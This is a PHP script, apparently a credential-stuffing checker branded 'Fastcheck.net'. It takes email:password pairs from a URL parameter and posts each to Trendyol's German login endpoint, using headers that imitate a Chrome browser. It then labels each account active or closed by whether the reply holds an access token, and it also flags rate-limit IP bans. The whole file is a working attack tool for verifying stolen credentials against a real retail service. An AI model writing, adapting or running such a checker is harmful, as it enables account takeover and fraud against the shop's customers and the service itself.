<?php
error_reporting(0);
set_time_limit(0);


$lista = htmlspecialchars($_GET['lista']);
$array = explode(":",$lista);

$mail = trim($array[0]);
$pw = trim($array[1]);


$arr = json_encode(array("email"=>$mail,"password"=>$pw));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://auth.trendyol.de/login");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'application-id: 1',
    'content-type: application/json;charset=UTF-8',
    'culture: de-DE',
    'origin: https://auth.trendyol.de',
    'referer: https://auth.trendyol.de/static/fragment?application-id=1&storefront-id=2&culture=de-DE&language=de&debug=false',
    'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'storefront-id: 2',
    'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $arr);
$fimson = curl_exec($ch);

if(strpos($fimson, 'accessToken') !== false) {
	echo "✅ <b>#Aktif</b> - $mail : $pw - Hesap Aktif ✅ - <b>www.Fastcheck.net</b> <br>";
}
elseif(strpos($fimson, 'Ihre E-Mail-Adresse und/oder Ihr Passwort ist falsch') !== false) {
	echo "❌ <b>#Kapalı</b> - $mail : $pw - Mail Veya Şifre Hatalı ❌ - <b>www.Fastcheck.net</b> <br>";
}
elseif(strpos($fimson, 'error code: 1015') !== false) {
	    echo "❌ <b>#Kapalı</b> - $mail : $pw - İp Ban Sunucu Sahibi İle Görüşünüz! ❌ - <b>www.Fastcheck.net</b> <br>";
}else{
	 echo "❌ <b>#Kapalı</b> - $mail : $pw - Sunucu Sahibi İle Görüşünüz! ❌ - <b>www.Fastcheck.net</b> <br>";
}

curl_close($curl);
?>